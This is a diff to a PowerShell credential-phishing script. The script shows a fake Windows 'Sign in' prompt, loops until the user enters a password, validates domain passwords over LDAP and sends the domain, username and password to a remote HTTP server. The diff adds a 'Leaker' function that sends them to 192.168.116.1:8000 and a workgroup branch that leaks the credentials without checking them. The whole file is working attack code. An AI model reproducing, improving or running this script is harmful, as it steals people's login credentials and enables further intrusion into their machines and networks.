@@ -15,20 +15,20 @@ $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.
 [Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
 [Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
 [Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
+#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $CurrentDomain_Name = $env:USERDOMAIN
 
 # For our While loop
 $status = $true
 
-$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
-    
+
 # There are 6 different authentication protocols supported. Can be seen here: https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
+$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
 $options.AuthenticationProtocol = 0
 $options.Caption = "Sign in"
 $options.Message = "Enter your credentials"
 $options.TargetName = "1"
-
 
 
 # CredentialPicker is using Async so we will need to use Await
@@ -39,6 +39,12 @@ function Await($WinRtTask, $ResultType) {
     $netTask.Result
 }
 
+function Leaker($domain,$username,$password){
+    try{
+        Invoke-WebRequest http://192.168.116.1:8000/$domain";"$username";"$password -Method GET -ErrorAction Ignore
+        }
+    catch{}
+    }
 
 function Credentials(){
     while ($status){
@@ -54,19 +60,20 @@ function Credentials(){
         else {
             $Username = $creds.CredentialUserName;
             $Password = $creds.CredentialPassword;
+            if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
+                $domain = "WORKGROUP"
+                Leaker($domain,$Username,$Password) 
+                $status = $false
+                exit
+                }
+
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
-
             $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
-
             if ($domain.name -eq $null){
                 Credentials
             }
             else {
-                try{
-                Invoke-WebRequest http://ServerIP:PORT/$CurrentDomain_Name";"$username";"$password -Method Get
-                }
-                catch{}
-
+                leaker($CurrentDomain_Name,$username,$password)
                 $status = $false
                 exit
             }
